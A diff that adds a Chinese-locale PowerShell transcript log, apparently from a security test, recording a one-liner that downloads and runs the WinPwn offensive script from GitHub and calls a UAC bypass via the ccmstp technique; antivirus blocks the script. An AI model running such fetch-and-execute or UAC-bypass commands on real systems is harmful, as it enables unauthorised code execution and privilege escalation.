@@ -1,0 +1,129 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415165553
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp}
+进程 ID: 3300
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp}
+PS>TerminatingError(Invoke-Expression):“所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。”
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415165601
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp}
+进程 ID: 3300
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。”
+iex : 所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。
+所在位置 行:2 字符: 1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+iex : 所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。
+所在位置 行:2 字符: 1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+iex : 所在位置 行:1 字符: 1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。
+所在位置 行:2 字符: 1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415165601
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp}
+进程 ID: 3300
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>CommandInvocation(Out-String):“Out-String”
+>> ParameterBinding(Out-String): 名称 =“InputObject”；值 =“无法将“UACBypass”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。”
+UACBypass : 无法将“UACBypass”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。
+所在位置 行:3 字符: 1
++ UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -te ...
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (UACBypass:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+UACBypass : 无法将“UACBypass”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次。
+所在位置 行:3 字符: 1
++ UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -te ...
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (UACBypass:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+UACBypass : 无法将“UACBypass”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径
+正确，然后再试一次。
+所在位置 行:3 字符: 1
++ UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -te ...
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (UACBypass:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230415165601
+**********************
